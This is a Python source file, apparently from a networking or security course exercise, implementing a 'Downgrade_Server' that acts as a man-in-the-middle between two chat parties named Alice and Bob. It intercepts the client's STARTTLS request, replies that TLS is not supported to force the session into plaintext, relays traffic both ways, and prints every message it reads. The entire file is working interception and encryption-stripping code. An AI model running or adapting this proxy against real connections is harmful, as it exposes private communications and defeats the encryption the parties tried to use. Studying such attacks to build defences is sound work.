import select, socket, queue as Queue
import chat_utils as chat_utils
from colorama import Fore, Style

class Downgrade_Server:
    def __init__(self, self_ip, server_ip, client_ip):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self_ip, 8000))
        self.server.listen(5)

        connection, client_address = self.server.accept()
        new_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        new_socket.connect((server_ip, 8000))
        print(Fore.CYAN + Style.BRIGHT + "Intercepting messages...\n")

        self.server.setblocking(0)
        new_socket.setblocking(0)
        self.start_downgrade(connection, new_socket)

    def start_downgrade(self, client_side, server_side):
        self.client_side = client_side
        self.server_side = server_side
        self.inputs = [client_side, server_side]
        self.outputs = []
        self.message_queues = {}
        self.message_queues[client_side] = Queue.Queue()
        self.message_queues[server_side] = Queue.Queue()
        self.fragment_lists = {}
        self.fragment_lists[client_side] = []
        self.fragment_lists[server_side] = []
        self.received_message_numbers = {}
        self.received_message_numbers[client_side] = 0
        self.received_message_numbers[server_side] = 0
        self.lastline_type = client_side
        while len(self.inputs) > 1:
            readable, writable, exceptional = select.select(self.inputs, self.outputs, self.inputs)
            for s in readable:
                incoming_msg = s.recv(4096).decode('UTF-8')
                if s is client_side:
                    if incoming_msg == chat_utils.CHAT_STARTTLS:
                        if client_side not in self.outputs:
                            self.outputs.append(client_side)
                        response = chat_utils.CHAT_STARTTLS_NOT_SUPPORTED
                        self.message_queues[client_side].put(response)
                    else:
                        self.message_queues[server_side].put(incoming_msg)
                        if server_side not in self.outputs:
                            self.outputs.append(server_side)
                        if chat_utils.CHAT_MESSAGE in incoming_msg:
                            self.handle_new_message(s, incoming_msg)
                else:
                    self.message_queues[client_side].put(incoming_msg)
                    if client_side not in self.outputs:
                        self.outputs.append(client_side)
                    if chat_utils.CHAT_MESSAGE in incoming_msg:
                        self.handle_new_message(s, incoming_msg)
            for s in writable:
                try:
                    next_msg = self.message_queues[s].get_nowait()
                except Queue.Empty:
                    self.outputs.remove(s)
                else:
                    if next_msg == chat_utils.CHAT_CLOSE:
                        person = 'Bob'
                        if s is server_side:
                            person = 'Alice'
                        print(Fore.RED + Style.BRIGHT + '\n' + person +' closed the connection!', Style.RESET_ALL+'\n')
                        s.send(next_msg.encode('UTF-8'))
                        self.close_connection(s)
                        break
                    else:
                        s.send(next_msg.encode('UTF-8'))
            for s in exceptional:
                self.close_connection(s)

    def handle_new_message(self, s, data):
        msg_num, num_fragments, fragment_num = chat_utils.get_message_details(data)
        if self.received_message_numbers[s] != msg_num:
            self.received_message_numbers[s] = msg_num
            if num_fragments == 1:
                self.print_message(s, data[28:])
            else:
                self.fragment_lists[s].append(data)
        else:
            if num_fragments == fragment_num:
                self.fragment_lists[s].append(data)
                received_msg = chat_utils.parse(self.fragment_lists[s])
                self.print_message(s, received_msg)
                self.fragment_lists[s].clear()
            else:
                self.fragment_lists[s].append(data)

    def print_message(self, s, message):
        if self.lastline_type != s:
            print("")
            self.lastline_type = s
        if s is self.client_side:
            print(Fore.YELLOW + Style.BRIGHT +'Alice says: ', Fore.BLUE + Style.BRIGHT + message, Fore.CYAN + Style.BRIGHT)
        else:
            print(Fore.MAGENTA + Style.BRIGHT +'Bob says: ', Fore.GREEN + Style.BRIGHT + message, Fore.CYAN + Style.BRIGHT)
    
    def close_connection(self, s):
        if s in self.outputs:
            self.outputs.remove(s)
        self.inputs.remove(s)
        s.close()
        del self.message_queues[s]
        del self.received_message_numbers[s]
        del self.fragment_lists[s]
